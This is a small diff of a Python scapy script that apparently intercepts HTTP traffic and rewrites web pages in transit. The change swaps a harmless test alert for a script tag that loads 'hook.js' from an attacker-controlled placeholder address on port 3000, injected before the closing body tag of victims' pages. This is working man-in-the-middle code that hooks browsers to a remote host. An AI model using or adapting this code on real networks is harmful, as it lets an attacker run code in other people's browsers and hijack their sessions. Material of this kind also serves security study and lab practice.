@@ -30,7 +30,7 @@ def spoofed_packet(packets):
         # Source Port
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            code_injection = "<script>alert('test');</script>"
+            code_injection = '<script src="http://<IP>:3000/hook.js"></script>'
             # Injecting HTML/JavaScript Code in the response field aka the html code of the website
             scapy_loader = scapy_loader.replace("</body>", code_injection + "</body>")
             search_content_length = regex.search("(?:Content-Length:\s)(\d*)", scapy_loader)
